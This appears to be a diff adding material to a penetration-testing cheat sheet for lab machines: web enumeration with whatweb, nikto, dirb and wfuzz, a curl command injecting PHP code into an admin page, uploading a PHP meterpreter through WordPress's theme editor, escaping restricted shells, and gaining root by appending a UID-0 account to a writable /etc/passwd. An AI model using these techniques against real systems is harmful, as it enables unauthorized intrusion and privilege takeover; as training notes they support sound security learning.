@@ -207,7 +207,33 @@ If a webserver is running on the machine, we can start with running
 whatweb
 ^^^^^^^
 
-Utilize whatweb to find what server is running. Further, we can execute nikto, w3af to find any vulnerabilities. dirb to find any hidden directories.
+Utilize whatweb to find what server is running.
+
+::
+
+ whatweb www.example.com
+ http://www.example.com [200 OK] Cookies[ASP.NET_SessionId,CMSPreferredCulture,citrix_ns_id], Country[INDIA][IN], Email[infosecurity@zmail.example.com], Google-Analytics[Universal][UA-6386XXXXX-2], HTML5, HTTPServer[Example Webserver], HttpOnly[ASP.NET_SessionId,CMSPreferredCulture,citrix_ns_id], IP[XXX.XX.XX.208], JQuery[1.11.0], Kentico-CMS, Modernizr, Script[text/javascript], Title[Welcome to Example Website ][Title element contains newline(s)!], UncommonHeaders[cteonnt-length,x-cache-control-orig,x-expires-orig], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=9,IE=edge]
+
+
+nikto
+^^^^^
+nikto - Scan web server for known vulnerabilities. It would examine a web server to find potential problems and security vulnerabilities, including:
+
+* Server and software misconfigurations
+* Default files and programs
+* Insecure files and programs
+* Outdated servers and programs
+
+dirb, wfuzz
+^^^^^^^^^^^
+
+Further, we can execute to find any hidden directories.
+
+* DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack against a web server and analizing the response.
+* wfuzz - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let's say, when we dirb we get 50 directories. Each directory containing a image. Most of the time, now we need to figure out which image is different. Here, we would figure out what's the size of the normal image and hide that particular response with wfuzz.
+
+.. Tip :: If the using the dirb/wfuzz wordlist doesn't result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories.
+
 
 PUT Method
 ^^^^^^^^^^
@@ -288,6 +314,8 @@ Wordpress configuration is stored in wp-config.php. If you are able to download 
 ::
 
   wpscan --url http://192.168.1.2 --wordlist wordlist.txt --username example_username
+
+.. Tip :: If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance > Editor > Possibly edit 404 Template.
 
 Names? Possible Usernames? Possible Passwords?
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
@@ -569,7 +597,16 @@ PHP
 
   http://IP/shell.php?cmd=id
 
- or 
+ If there's a webpage which accepts phpcode to be executed, we can use curl to urlencode the payload and run it.
+
+ ::
+
+  curl -G -s http://10.10.10.27/admin.php?data= --data-urlencode "html=<?php passthru('ls -lah'); ?>" -b "adminpowa=noonecares" | sed '/<html>/,/<\/html>/d'
+  
+  -G When used, this option will make all data specified with -d, --data, --data-binary or --data-urlencode to be used in an HTTP GET request instead of the POST request that otherwise would be used. The data will be appended to the URL with a  '?' separator.
+  -data-urlencode <data> (HTTP) This posts data, similar to the other -d, --data options with the exception that this performs URL-encoding. 
+  -b, --cookie <data> (HTTP) Pass the data to the HTTP server in the Cookie header. It is supposedly the data previously received from the server in a "Set-Cookie:" line.  The data should be in the format "NAME1=VALUE1; NAME2=VALUE2".
+ 
 
 * **PHP Meterpreter**
 
@@ -903,10 +940,12 @@ Reconnaissance
 Find out information about the environment.
 
 * Run env to see exported environment variables
+
 * Run 'export -p' to see the exported variables in the shell. This would tell which variables are read-only. Most likely the PATH ($PATH) and SHELL ($SHELL) variables are '-rx', which means we can execute them, but not write to them. If they are writeable, we would be able to escape the restricted shell! 
 
  * If the SHELL variable is writeable, you can simply set it to your shell of choice (i.e. sh, bash, ksh, etc...). 
  * If the PATH is writeable, then you'll be able to set it to any directory you want. I recommend setting it to one that has commands vulnerable to shell escapes.
+
 * Try basic Unix commands and see what's allowed ls, pwd, cd, env, set, export, vi, cp, mv etc.
 
 Quick Wins
@@ -1141,6 +1180,21 @@ A few 'common' places: /tmp, /var/tmp, /dev/shm
   find / -perm -o x -type f 2>/dev/null     # world-executable files
 
   find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
+
+* If the below files are world writable, we could do privilege escalation.
+
+ * /etc/passwd 
+
+  * Passwords are normally stored in /etc/shadow, which is not readable by users. However, historically, they were stored in the world-readable file /etc/passwd along with all account information. 
+  * For backward compatibility, if a password hash is present in the second column in /etc/passwd, it takes precedence over the one in /etc/shadow. 
+  * Historically, an empty second field in /etc/passwd means that the account has no password, i.e. anybody can log in without a password (used for guest accounts). This is sometimes disabled. 
+  * If passwordless accounts are disabled, you can put the hash of a password of your choice. You can use the crypt function to generate password hashes, for example
+
+   ::
+    
+      perl -le 'print crypt("foo", "aa")' to set the password to foo. 
+
+  * It's possible to gain root access even if you can only append to /etc/passwd and not overwrite the contents. That's because it's possible to have multiple entries for the same user, as long as they have different names — users are identified by their ID, not by their name, and the defining feature of the root account is not its name but the fact that it has user ID 0. So you can create an alternate root account by appending a line that declares an account with another name, a password of your choice and user ID 0
 
 Any "problem" files?
 ^^^^^^^^^^^^^^^^^^^^
@@ -1830,6 +1884,11 @@ HTTP 404 Custom Page
 ^^^^^^^^^^^^^^^^^^^^
 Sometimes, it's a good idea to look at 404 custom page also. There might be some information store.d
 
+PHP
+^^^
+
+* PHP's preg_replace() function which can lead to RCE. It's deprecated in later revisions (PHP >= 5.5.0). If you think there's a pattern which is replaced in a text, refer `The unexpected dangers of preg_replace() <https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace>`_ 
+
 run-parts
 ---------
 
@@ -1886,6 +1945,8 @@ Looking for hidden text in the images? Utilize steghide
   version, --version      display version information
   license, --license      display steghide's license
   help, --help            display this usage information
+
+.. Tip :: Sometimes, there is no password, so just press enter.
 
 Git client Privilege Escalation
 --------------------------------
@@ -2017,6 +2078,17 @@ Others
   UBUNTU\_CODENAME=xenial
 
 * Many times if IPv6 is enabled, probably you can utilize IPv6 to connect and bypass firewall restrictions ( If firewall is not implemented at IPv6 level - many times it is not ).
+
+ * To find IPv6 from SNMP 
+
+  :: 
+
+   snmpwalk -v2c -c public prism 1.3.6.1.2.1.4.34.1.3    
+   iso.3.6.1.2.1.4.34.1.3.2.48.1.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 335544320
+   iso.3.6.1.2.1.4.34.1.3.2.48.2.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 335544321
+   iso.3.6.1.2.1.4.34.1.3.2.48.2.18.52.86.120.171.205.0.0.0.0.0.0.0.1 = INTEGER: 335544323
+
+  Now, convert the decimal value after "iso.3.6.1.2.1.4.34.1.3.2" to hex which would be your IPv6 address "3002:1234:5678:ABCD::1"
 
  .. ToDo ::  Mention examples for IPv6 connect
 
@@ -2169,6 +2241,9 @@ Others
 
    dpkg-query -l 'perl*'
 
+* It's always important to note down all the passwords found during the process of exploiting a vulnerable machine as there is a great possibility that passwords would be reused.
+ 
+* If you have .jar file, Probably use jd-gui to decompile and view the class file. 
 
 
 * Find recently modified files:
